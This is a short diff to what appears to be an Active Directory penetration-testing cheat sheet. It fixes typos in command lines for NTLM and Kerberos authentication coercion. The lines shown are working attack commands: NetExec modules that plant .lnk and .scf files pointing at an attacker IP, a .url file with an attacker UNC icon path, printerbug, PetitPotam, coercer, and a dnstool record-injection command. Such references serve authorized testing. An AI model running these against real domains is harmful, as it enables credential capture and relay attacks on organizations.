@@ -51,7 +51,7 @@
   - .lnk
     - `nxc smb <dc_ip> -u '<user>' -p '<password>' -M slinky -o NAME=<filename> SERVER=<attacker_ip>`
   - .scf
-    - `nxc smb <dc_ip> -u '<user>' -p '<password>' -M sucffy -o NAME=<filename> SERVER=<attacker_ip>`
+    - `nxc smb <dc_ip> -u '<user>' -p '<password>' -M scuffy -o NAME=<filename> SERVER=<attacker_ip>`
   - .url
     - `[InternetShortcut]... IconFile=\\<attacker_ip>\%USERNAME%.icon`
   - Other files
@@ -65,7 +65,7 @@
   - Launch coerce with <attacker_hostname>@80/x as target >>> HTTP Coerce
 - RPC call >>> SMB NTLM Coerce
   - `printerbug.py <domain>/<username>:<password>@<printer_ip> <listener_ip>`
-  - `petitpotam.py -d <domain> -u <user> -p <password> <listnerer_ip> <target_ip>`
+  - `petitpotam.py -d <domain> -u <user> -p <password> <listener_ip> <target_ip>`
   - `coercer.py -d <domain> -u <user> -p <password> -t <target> -l <attacker_ip>`
 - Coerce kerberos >>> SMB Kerberos coerce
   - `dnstool.py -u "<domain>\<user>" -p '<password>' -d "<attacker_ip>" --action add "<dns_server_ip>" -r "<servername>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" --tcp`
